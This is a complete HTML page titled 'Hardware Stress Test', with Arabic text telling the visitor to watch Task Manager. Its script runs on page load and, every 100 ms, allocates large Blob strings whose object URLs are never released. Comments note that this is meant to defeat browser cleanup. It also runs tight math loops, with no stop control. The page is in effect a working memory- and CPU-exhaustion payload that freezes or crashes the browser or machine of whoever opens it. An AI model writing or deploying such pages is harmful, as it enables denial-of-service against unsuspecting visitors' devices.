<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Hardware Stress Test</title>
</head>
<body style="background:#000; color:#0f0; text-align:center; padding-top:100px;">
    <h1>اختبار الأداء مفعل الآن...</h1>
    <p>راقب مدير المهام (Task Manager) الآن</p>
    <h2 id="ram-usage">0 MB</h2>

    <script>
        // دالة لتجاوز الكاش عبر توليد بيانات عشوائية باستمرار
        function forceLoad() {
            let memoryHog = [];
            
            // استخدام الـ Blobs لأن المتصفح يجد صعوبة في تنظيفها فوراً
            setInterval(() => {
                try {
                    // توليد نص عشوائي ضخم جداً وتحويله لـ Blob
                    let heavyString = new Array(1000000).fill(Math.random().toString()).join('');
                    let blob = new Blob([heavyString], {type: 'text/plain'});
                    memoryHog.push(URL.createObjectURL(blob));
                    
                    document.getElementById('ram-usage').innerText = "تم استهلاك: " + (memoryHog.length * 2) + " MB تقريباً";
                    
                    // ضغط المعالج بحسابات رياضية لا تتوقف
                    for(let i=0; i<1000000; i++) {
                        Math.exp(Math.random() * Math.log(Math.random()));
                    }
                } catch(e) {
                    console.error("Memory Full!");
                }
            }, 100);
        }

        // بدء التنفيذ فوراً
        window.onload = forceLoad;
    </script>
</body>
</html>
